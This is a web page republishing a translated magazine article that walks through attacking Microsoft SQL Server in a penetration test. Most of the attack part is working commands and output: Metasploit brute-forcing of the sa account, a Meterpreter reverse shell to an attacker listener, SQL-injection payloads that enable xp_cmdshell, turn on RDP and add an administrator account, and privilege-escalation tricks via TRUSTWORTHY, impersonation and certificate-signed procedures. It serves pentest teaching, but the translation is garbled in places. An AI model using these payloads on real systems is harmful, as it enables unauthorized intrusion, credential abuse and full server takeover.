<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We check MS SQL for durability. Vectors of attacks on MS SQL Server</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Practically no serious pentest can do without checking the DBMS, because this is one of the most popular doors for intruders to the desired informatio...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We check MS SQL for durability. Vectors of attacks on MS SQL Server</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/1a9/75c/fbd/1a975cfbd04099d6067f6bd9db375668.jpg" alt="image"><br><br>  Practically no serious pentest can do without checking the DBMS, because this is one of the most popular doors for intruders to the desired information and machine.  In large projects, MS SQL Server is very often used as a DBMS.  And we‚Äôll talk about verification of his safety today.  We will not discover America - experienced comrades will only refresh their knowledge, but for those who are just starting to master the topic, I tried to sort everything out as detailed as possible. <br><a name="habracut"></a><br><h4>  Introduction </h4><br>  One of the most important criteria for the reliability of an information system is database security.  Attacks aimed at it, in most cases, are critical, because they can partially or completely disrupt the performance of the system.  Since large organizations formed their infrastructure a long time ago and updating to new versions of software causes them to have ‚Äúbig‚Äù problems, MS SQL Server 2005 and MS SQL Server 2008 remain the most common versions. But these are just statistics, and we will continue consider common to all versions of vectors and technology.  For convenience, we conditionally divide the whole process of pentest into several stages. <br><br><h4>  How to find MS SQL </h4><br>  The first thing the pentester begins to do is to collect information about the services located on the victim‚Äôs server.  The most important thing to know when searching for Microsoft SQL Server is the port numbers that it listens to.  And he listens to ports 1433 (TCP) and 1434 (UDP).  To check if MS SQL is available on the victim's server, you need to scan it.  For this, you can use Nmap with the `ms-sql-info` script.  The scan will start like this: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="bash hljs">nmap -p 1433 --script=ms-sql-info 192.168.18.128</code> </pre> <br>  Well, the result of its implementation is presented in Fig.  one. <br><br><img src="https://habrastorage.org/files/835/041/891/83504189100248899e0bb5fd6dd9b73b.jpg"><br>  Fig.  1. Scanning MS SQL with Nmap <br><br>  In addition to Nmap, there is an excellent scanning module for Metasploit `mssql_ping`, which also allows you to determine the presence of MS SQL on the attacked server: <br><br><pre> <code class="bash hljs">msf&gt; use auxilary/scanner/mssql/mssql_ping msf auxilary(mssql_ping) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> RHOSTS 192.167.1.87 RHOSTS =&gt; 192.168.1.87 msf auxilary(mssql_ping) &gt; run</code> </pre><br><img src="https://habrastorage.org/files/444/4bd/588/4444bd5886d643ddbbc5986f3fd44abc.jpg"><br>  Fig.  2. Scan MS SQL using mssql_ping <br><br>  Using one of these options, you can quickly determine whether MS SQL is installed on the server, as well as find out its version.  Then you can proceed to the next stage. <br><br><h4>  Brute force </h4><br>  Suppose we found a DBMS on the server.  Now the task is to get access to it.  And here we are met by the first obstacle in the form of authentication.  In general, MS SQL supports two types of authentication: <br><br><ol><li>  Windows Authentication is a trusted connection in which SQL Server accepts a user account, assuming that it is already verified at the operating system level. </li><li>  Mixed Mode - Authentication with SQL Server + Windows Authentication. </li></ol><br>  By default, the first authentication mode is used, and the mixed mode is activated separately.  In practice, it is quite difficult to meet the base without a mixed mode - it is more flexible. <br><br><blockquote><h4>  Some advantages of mixed mode </h4><br><ul><li>  Allows SQL Server to support older applications, as well as third-party applications that require SQL Server authentication. </li><li>  Allows SQL Server to support environments with multiple operating systems in which users are not authenticated to the Windows domain. </li><li>  Allows software developers to distribute their applications using a complex hierarchy of permissions based on well-known, predefined SQL Server logins. </li></ul></blockquote><br>  Usually at this stage we do not have access to the corporate network, thus we cannot use authentication through Windows.  But we found an open port with MS SQL, which means we are trying to rotate the admin sa account, which is standard for mixed mode.  To automate the process, use the Metasploit module `mssql_login`: <br><br><pre> <code class="bash hljs">msf &gt; use auxiliary/scanner/mssql/mssql_login msf auxiliary(mssql_login) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> RHOSTS 172.16.2.104 RHOSTS =&gt; 172.16.2.104 msf auxiliary(mssql_login) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> PASS_FILE /root/Desktop/pass.txt [*] 172.16.2.104:1433 - MSSQL - Starting authentication scanner. [*] 172.16.2.104:1433 - LOGIN FAILED: WORKSTATION\sa:admin (Incorrect: ) [*] 172.16.2.104:1433 - LOGIN FAILED: WORKSTATION\sa:qwerty (Incorrect: ) [*] 172.16.2.104:1433 - LOGIN FAILED: WORKSTATION\sa:toor (Incorrect: ) [+] 172.16.2.104:1433 - LOGIN SUCCESSFUL: WORKSTATION\sa:root [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed</code> </pre><br>  Fine!  The password is found, now we can proceed to the next stage.  But what if the server sa?  Then you have to log in and login, for which you will need to tell the script one more file, where to get them from: <br><br><pre> <code class="bash hljs">msf auxiliary(mssql_login) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> USER_FILE /root/Desktop/user.txt</code> </pre><br><blockquote><h4>  Www </h4><br>  A wide variety of brute force dictionaries can be found <a href="https://github.com/danielmiessler/SecLists">here</a> . </blockquote><br><h4>  Getting the shell </h4><br>  In case we managed to clear the sa `s account, we can log in to the database.  Further, the script is simple - we include a stored procedure that allows you to execute commands at the operating system level, and uploads to the Meterpreter server shell.  Cool guys wrote for Metasploit an excellent module `mssql_payload`, which automates this process: <br><br><pre> <code class="bash hljs">msf &gt; use exploit/windows/mssql/mssql_payload msf exploit(mssql_payload) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> RHOST 172.16.2.104 msf exploit(mssql_payload) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> USERNAME sa USERNAME =&gt; sa msf exploit(mssql_payload) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> PASSWORD root PASSWORD =&gt; root msf exploit(mssql_payload) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD =&gt; windows/meterpreter/reverse_tcp msf exploit(mssql_payload) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> LHOST 172.16.2.105 LHOST =&gt; 172.16.2.105 [*] Command Stager progress - 100.00% <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> (102246/102246 bytes) [*] Meterpreter session 1 opened (172.16.2.105:4444 -&gt; 172.16.2.104:3987) at 2015-02-20 10:42:52 -0500 meterpreter &gt;</code> </pre><br>  Session Meterpreter'a created, now you have full access.  You can dump the admin hash, take screenshots, create / delete files, turn on / off the mouse or keyboard and much more.  This is probably the most popular shell that is used in penetration tests.  The full list of Meterpreter commands can be found <a href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics">here</a> . <br><br><h4>  What to do if the login / password is not twisted? </h4><br>  But make no mistake, not so often the module `mssql_login` will please you: admins very rarely leave the password to default.  In this case, SQL-injection will help us get the shell.  Imagine the HTML form in which the user enters the article number and a simple vulnerable query to the database, all of which work under the admin sa account: <br><br><pre> <code class="php hljs">$strSQL = ‚ÄúSELECT * FROM [dbo].[articles] WHERE id=$id‚Äù;</code> </pre><br>  The variable `$ id` is not filtered in any way, which means it is possible to conduct a SQL injection in which any query will be executed from under the admin's` sa` account.  In order to execute commands at the operating system level, you must activate the stored procedure `xp_cmdshell`, which is disabled by default.  We will need to send four requests to activate it: <br><br><ol><li>  `10;  EXEC sp_configure 'show advanced options', 1; ` </li><li>  `10;  reconfigure; ` </li><li>  `10;  'exec sp_configure' xp_cmdshell ', 1; ` </li><li>  `10;  reconfigure` </li></ol><br>  The `sp_configure` system stored procedure allows you to view, document, modify and restore server configuration.  The easiest way to access the server is to enable RDP through the registry, create a user with admin rights and connect. <br><br>  Enable RDP: <br><br><pre> <code class="dos hljs"><span class="hljs-number"><span class="hljs-number">10</span></span>; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number"><span class="hljs-number">0</span></span> /f</code> </pre><br>  Create user: <br><br><pre> <code class="dos hljs"><span class="hljs-number"><span class="hljs-number">10</span></span>; exec master.dbo.xp_cmdshell '<span class="hljs-built_in"><span class="hljs-built_in">net</span></span> user root toor /ADD'</code> </pre><br>  Giving rights: <br><br><pre> <code class="dos hljs"><span class="hljs-number"><span class="hljs-number">10</span></span>;exec master.dbo.xp_cmdshell '<span class="hljs-built_in"><span class="hljs-built_in">net</span></span> localgroup administrators root/add'</code> </pre><br><h4>  Privilege escalation.  TRUSTWORTHY </h4><br>  In the previous case, the request to the database was made on behalf of the administrator, and therefore it was so easy to execute commands of the operating system.  But what if we have a curtailed account that does not have permission to include `xp_cmdshell`?  In this case, the stored procedures and the activated property `TRUSTWORTHY` on the base will help us. <br><br>  But let's start from the beginning.  For greater clarity, this vector will describe the entire stage at the stage of configuration of the database and accounts.  Create a new base `YOLO`:` CREATE DATABASE YOLO; `.  Create a new user `bob` with the password` marley`: `CREATE LOGIN bob WITH PASSWORD = 'marley';` Assign the user `bob` as the owner of the base` YOLO`: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">USE</span></span> YOLO <span class="hljs-keyword"><span class="hljs-keyword">ALTER</span></span> LOGIN [bob] <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> default_database = [YOLO]; <span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">USER</span></span> [bob] <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> LOGIN [bob]; EXEC sp_addrolemember [db_owner], [bob];</code> </pre><br>  Then we set the property `TRUSTWORTHY`, which determines whether to allow objects of this database (views, user-defined functions, stored procedures) to access objects outside this database in the impersonation mode:` ALTER DATABASE YOLO SET TRUSTWORTHY ON`.  Login to SQL Server under `bob: marley` account. <br>  Create a stored procedure to assign the sysadmin privileges to the bob account: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">USE</span></span> YOLO <span class="hljs-keyword"><span class="hljs-keyword">GO</span></span> <span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">PROCEDURE</span></span> sp_lvlup <span class="hljs-keyword"><span class="hljs-keyword">WITH</span></span> <span class="hljs-keyword"><span class="hljs-keyword">EXECUTE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">AS</span></span> OWNER <span class="hljs-keyword"><span class="hljs-keyword">AS</span></span> EXEC sp_addsrvrolemember <span class="hljs-string"><span class="hljs-string">'bob'</span></span>,<span class="hljs-string"><span class="hljs-string">'sysadmin'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">GO</span></span></code> </pre><br>  Make sure that before the execution of the stored procedure, we do not have sysadmin privileges: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> is_srvrolemember(<span class="hljs-string"><span class="hljs-string">'sysadmin'</span></span>)  = <span class="hljs-number"><span class="hljs-number">0</span></span></code> </pre><br>  Perform the above stored procedure `sp_lvlup`: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">USE</span></span> YOLO EXEC sp_lvlup</code> </pre><br>  And again we will check our privileges: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> is_srvrolemember(<span class="hljs-string"><span class="hljs-string">'sysadmin'</span></span>)  = <span class="hljs-number"><span class="hljs-number">1</span></span></code> </pre><br>  The `sp_lvlup` procedure is designed to run on behalf of` OWNER`, which in this case is the admin account `sa`.  This is possible because `db_owner` created a stored procedure for its database, and this database is configured as reliable, that is, the property` TRUSTWORTHY = On`.  Without this property, it would not be possible to execute the procedure due to lack of privileges.  The activated property TRUSTWORTHY is not always bad.  Problems begin when administrators do not lower privileges to database owners.  As a result, the `bob` account after the execution of the` sp_lvlup` procedure has been granted the privileges of `sysadmin`.  To see which bases have the property `TRUSTWORTHY` activated, you can use the following query: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span>, database_id, is_trustworthy_on <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> sys.databases</code> </pre><br><br>  Or to automate the entire process, you can use the module for Metasploita `mssql_escalate_dbowner_sqli`: <br><br><pre> <code class="bash hljs">use auxiliary/admin/mssql/mssql_escalate_dbowner_sqli <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> rhost 172.16.2.104 <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> rport 80 <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> GET_PATH /login.asp?id=1+and+1=[SQLi];-- exploit ... [+] 172.16.2.104:80 - Success! Bob is now a sysadmin!</code> </pre><br><h4>  Privilege escalation.  User Impersonation </h4><br>  The following vector is called User Impersonation.  Sometimes stored procedures need access to external resources outside the application base.  To accomplish this, developers use the privileges of IMPERSONATE and the EXECUTE AS function, which allows them to execute a query on behalf of another account.  This is not a vulnerability per se, but rather a weak configuration, leading to escalation of privileges. <br><br>  As in the previous example, we will begin to analyze the essence of the vector at the configuration stage.  First of all, create four accounts: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> LOGIN User1 <span class="hljs-keyword"><span class="hljs-keyword">WITH</span></span> <span class="hljs-keyword"><span class="hljs-keyword">PASSWORD</span></span> = <span class="hljs-string"><span class="hljs-string">'secret'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> LOGIN User2 <span class="hljs-keyword"><span class="hljs-keyword">WITH</span></span> <span class="hljs-keyword"><span class="hljs-keyword">PASSWORD</span></span> = <span class="hljs-string"><span class="hljs-string">'secret'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> LOGIN User3 <span class="hljs-keyword"><span class="hljs-keyword">WITH</span></span> <span class="hljs-keyword"><span class="hljs-keyword">PASSWORD</span></span> = <span class="hljs-string"><span class="hljs-string">'secret'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> LOGIN User4 <span class="hljs-keyword"><span class="hljs-keyword">WITH</span></span> <span class="hljs-keyword"><span class="hljs-keyword">PASSWORD</span></span> = <span class="hljs-string"><span class="hljs-string">'secret'</span></span>;</code> </pre><br>  Then we give the user `User1` privileges to execute requests on behalf of` sa`, `User2`,` User3`: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">USE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">master</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">GRANT</span></span> IMPERSONATE <span class="hljs-keyword"><span class="hljs-keyword">ON</span></span> LOGIN::sa <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> [MyUser1]; <span class="hljs-keyword"><span class="hljs-keyword">GRANT</span></span> IMPERSONATE <span class="hljs-keyword"><span class="hljs-keyword">ON</span></span> LOGIN::MyUser2 <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> [MyUser1]; <span class="hljs-keyword"><span class="hljs-keyword">GRANT</span></span> IMPERSONATE <span class="hljs-keyword"><span class="hljs-keyword">ON</span></span> LOGIN::MyUser3 <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> [MyUser1]; GO</code> </pre><br>  We log in to SQL Server under the account `User1` and check if the privileges have been applied to execute requests from other accounts. <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">distinct</span></span> b.name <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> sys.server_permissions a <span class="hljs-keyword"><span class="hljs-keyword">INNER</span></span> <span class="hljs-keyword"><span class="hljs-keyword">JOIN</span></span> sys.server_principals b <span class="hljs-keyword"><span class="hljs-keyword">ON</span></span> a.grantor_principal_id = b.principal_id <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> a.permission_name = <span class="hljs-string"><span class="hljs-string">'IMPERSONATE'</span></span></code> </pre><br>  Now check the current privileges: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SYSTEM_USER</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> IS_SRVROLEMEMBER(<span class="hljs-string"><span class="hljs-string">'sysadmin'</span></span>)  = <span class="hljs-number"><span class="hljs-number">0</span></span></code> </pre><br>  Well, now the actual trick itself is to execute the request on behalf of `sa`, since above we gave the privileges of the` User1` account to execute requests on behalf of `sa`: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">EXECUTE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">AS</span></span> LOGIN = <span class="hljs-string"><span class="hljs-string">'sa'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SYSTEM_USER</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> IS_SRVROLEMEMBER(<span class="hljs-string"><span class="hljs-string">'sysadmin'</span></span>)  = <span class="hljs-number"><span class="hljs-number">1</span></span></code> </pre><br>  All right, we can now execute commands on behalf of `sa`, which means we can include the stored procedure` xp_cmdshell`: <br><br><pre> <code class="sql hljs">EXEC sp_configure '<span class="hljs-keyword"><span class="hljs-keyword">show</span></span> <span class="hljs-keyword"><span class="hljs-keyword">advanced</span></span> options<span class="hljs-string"><span class="hljs-string">',1 RECONFIGURE GO EXEC sp_configure '</span></span>xp_cmdshell<span class="hljs-string"><span class="hljs-string">',1 RECONFIGURE GO</span></span></code> </pre><br><blockquote><h4>  INFO </h4><br>  The default `sysadmin` account can execute queries on behalf of any other users.  To display a table with all users will help you a query: `SELECT * FROM master.sys.sysusers WHERE islogin = 1`.  To execute a query on behalf of another account, use `EXECUTE AS LOGIN = 'AnyUser'`.  To return again to the previous account, simply run the query `REVERT`. </blockquote><br>  That's the whole trick.  To automate, as usual, you can use the Metasploit module `mssql_escalate_executeas_sqli`: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">use</span></span> auxiliary/<span class="hljs-keyword"><span class="hljs-keyword">admin</span></span>/mssql/mssql_escalate_execute_as_sqliex <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> rhost <span class="hljs-number"><span class="hljs-number">172.16</span></span><span class="hljs-number"><span class="hljs-number">.2</span></span><span class="hljs-number"><span class="hljs-number">.104</span></span> <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> rport <span class="hljs-number"><span class="hljs-number">80</span></span> <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> GET_PATH /login.asp?<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-keyword"><span class="hljs-keyword">and</span></span>+<span class="hljs-number"><span class="hljs-number">1</span></span>=[SQLi];<span class="hljs-comment"><span class="hljs-comment">-- exploit ... [+] 172.16.2.104:80 - Success! User1 is now a sysadmin!</span></span></code> </pre><br><h4>  Privilege escalation.  Certificate-Signed Stored Procedures </h4><br>  To describe this vector, we will create a vulnerable stored procedure signed with a certificate.  Unlike the previous examples, for escalation of privileges are optional: <br><br><ul><li>  property `TRUSTWORTHY = On`; </li><li>  privileges `IMPERSONATE` and the function` EXECUTE AS`; </li><li>  configuring a stored procedure with the `WITH EXECUTE AS` class to execute it on behalf of another account. </li></ul><br>  Create an account with minimal rights: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> LOGIN tor <span class="hljs-keyword"><span class="hljs-keyword">WITH</span></span> <span class="hljs-keyword"><span class="hljs-keyword">PASSWORD</span></span> = <span class="hljs-string"><span class="hljs-string">'loki'</span></span>; GO <span class="hljs-comment"><span class="hljs-comment">-- Set login's default database ALTER LOGIN [tor] with default_database = [master]; GO</span></span></code> </pre><br>  Turn off the property `TRUSTWORTHY`:` ALTER DATABASE master SET TRUSTWORTHY OFF`.  And create a simple stored procedure `sp_xxx`, which will output the column` name` from the database `tempdb`, as well as from the database that the user entered: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">USE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">MASTER</span></span>; GO <span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">PROCEDURE</span></span> sp_xxx @DbName <span class="hljs-built_in"><span class="hljs-built_in">varchar</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">max</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">AS</span></span> <span class="hljs-keyword"><span class="hljs-keyword">BEGIN</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Declare</span></span> @<span class="hljs-keyword"><span class="hljs-keyword">query</span></span> <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> <span class="hljs-built_in"><span class="hljs-built_in">varchar</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">max</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">SET</span></span> @<span class="hljs-keyword"><span class="hljs-keyword">query</span></span> = <span class="hljs-string"><span class="hljs-string">'SELECT name FROM master..sysdatabases where name like ''%'</span></span>+ @DbName+<span class="hljs-string"><span class="hljs-string">'%'' OR name=''tempdb'''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">EXECUTE</span></span>(@<span class="hljs-keyword"><span class="hljs-keyword">query</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">END</span></span> <span class="hljs-keyword"><span class="hljs-keyword">GO</span></span></code> </pre><br>  After that, create an encryption key for the `MASTER` base: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">MASTER</span></span> <span class="hljs-keyword"><span class="hljs-keyword">KEY</span></span> ENCRYPTION <span class="hljs-keyword"><span class="hljs-keyword">BY</span></span> <span class="hljs-keyword"><span class="hljs-keyword">PASSWORD</span></span> = <span class="hljs-string"><span class="hljs-string">'secret'</span></span>; GO</code> </pre><br>  And certificate: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> CERTIFICATE sp_xxx_cert <span class="hljs-keyword"><span class="hljs-keyword">WITH</span></span> SUBJECT = <span class="hljs-string"><span class="hljs-string">'To sign the sp_xxx'</span></span>, EXPIRY_DATE = <span class="hljs-string"><span class="hljs-string">'2035-01-01'</span></span>; GO</code> </pre><br>  The next step is to create a login from the `sp_xxx` certificate: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> LOGIN sp_xxx_login <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> CERTIFICATE sp_xxx_cert</code> </pre><br>  And we will sign the procedure with the certificate created: <br><br><pre> <code class="sql hljs">ADD SIGNATURE to sp_xxx BY CERTIFICATE sp_xxx_cert; GO</code> </pre><br>  Give the sp_lvlup2` login the privileges of `sysadmin`: <br><br><pre> <code class="sql hljs">EXEC master..sp_addsrvrolemember @loginame = N'sp_xxx_login', @rolename = N'sysadmin' GO</code> </pre><br>  We give privileges to members of the PUBLIC group to perform the procedure: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">GRANT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">EXECUTE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">ON</span></span> sp_xxx <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">PUBLIC</span></span></code> </pre><br>  As a result, we created the user `tor` with minimal rights, the stored procedure` sp_xxx`, which displays the name of the entered database, created the certificate `sp_xxx_cert` and signed the stored procedure with them, and also created the login` sp_xxx_login` from the certificate and gave it the privileges `sysadmin `.  At this preparatory part is over.  Login as the `tor` account and call the stored procedure: <br><br><pre> <code class="sql hljs">EXEC MASTER.dbo.sp_xxx 'master'</code> </pre><br>  As expected, it will return to us the name of the specified database - `master` and` tempdb` (see. Fig. 3). <br><br><img src="https://habrastorage.org/files/fae/598/7cf/fae5987cf1b94ac0a29f026d1ca34682.png"><br>  Fig.  3. The result of the query EXEC MASTER.dbo.sp_xxx 'master' <br><br>  A query like `EXEC MASTER.dbo.sp_sqli2 'master' '-'` will only return `master` (see. Fig. 4). <br><br><img src="https://habrastorage.org/files/848/f6f/173/848f6f17333f42f88410a90e828c4362.png"><br>  Figure 4.  The result of the query EXEC MASTER.dbo.xxx 'master' '-' <br><br>  Fine.  This means that the stored procedure is subject to SQL injection.  Check our privileges with the following query: <br><br><pre> <code class="sql hljs">EXEC MASTER.dbo.sp_xxx 'master'';<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> is_srvrolemember(<span class="hljs-string"><span class="hljs-string">''</span></span>sysadmin<span class="hljs-string"><span class="hljs-string">''</span></span>)<span class="hljs-keyword"><span class="hljs-keyword">as</span></span> priv_certsp<span class="hljs-comment"><span class="hljs-comment">--';</span></span></code> </pre><br><img src="https://habrastorage.org/files/9e1/a55/b5c/9e1a55b5cbdc4994bedd97c22d22a682.png"><br>  Fig.  5. We check our privileges through a vulnerable stored procedure. <br><br>  `priv_cersp = 1` (see Figure 5) means that we have the privileges of sysadmin.  The command `EXEC master..xp_cmdshell 'whoami';` does not work, because the `tor` account has minimum permissions, but if this query is inserted into a SQL injection, then everything will work (Fig. 6). <br><br><img src="https://habrastorage.org/files/13b/4d5/a78/13b4d5a78655464292ad43adcd46d911.png"><br>  Fig.6.  We check our privileges in the system <br><br>  What is most interesting, such a trick will work in versions 2005-2014. <br><br><h4>  Conclusion </h4><br>  The difference in all these vectors is very significant.  In some cases, to achieve the goal, you can limit the included property `TRUSTWORTHY`, which allows using objects from this database to objects outside, in order to create and execute a stored procedure that increases privileges.  Somewhere it is possible to execute stored procedures on behalf of other accounts due to the presence of the privileges `IMPERSONATE` and the function` EXECUTE AS`, and in the third cases it is only important to have a SQL injection through which the query can be implemented, and it will be executed on behalf of another account records  For a complete understanding of the nuances and subtleties, I would advise checking these vectors on my local machine. <br><br>  The article does not provide an exhaustive account of all attack vectors on MS SQL DBMS, but it will be very useful for a surface analysis of security.  I also recommend that you familiarize yourself with another hacking vector via DB link, which Alexei Tyurin described in the December issue] [(# 191) in the Easy Hack section.  That's all, thank you for your attention and see you soon. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/404/79a/e32/40479ae325c224b6ebd0868509f26d3d.jpg" alt="image"><br><br>  <i>First published in the magazine "Hacker" from 04/2015.</i> <i><br></i>  <i>Posted by Nikita ¬´ir0n¬ª Kelesis, Digital Security ( <a href="https://twitter.com/nkelesis">@nkelesis</a> , nikita.elkey@gmail.com)</i> <br><br>  Subscribe to "Hacker" <br><ul><li>  <a href="https://xakep.ru/wp-admin/profile.php%3Fpage%3Dpaywall_subscribes">Site materials</a> </li><li>  <a href="http://bit.ly/habr_subscribe_paper">Paper version</a> </li><li>  <a href="http://bit.ly/xakep_on_ipad">Hacker on iOS / iPad</a> </li><li>  <a href="http://bit.ly/habr_android">"Hacker" on Android</a> </li></ul></div><p>Source: <a href="https://habr.com/ru/post/256667/">https://habr.com/ru/post/256667/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../256655/index.html">All about triggers in Oracle</a></li>
<li><a href="../256659/index.html">Anatomy of IPsec. Check the strength of the legendary protocol</a></li>
<li><a href="../256661/index.html">Car Hacking: Are car safety systems safe?</a></li>
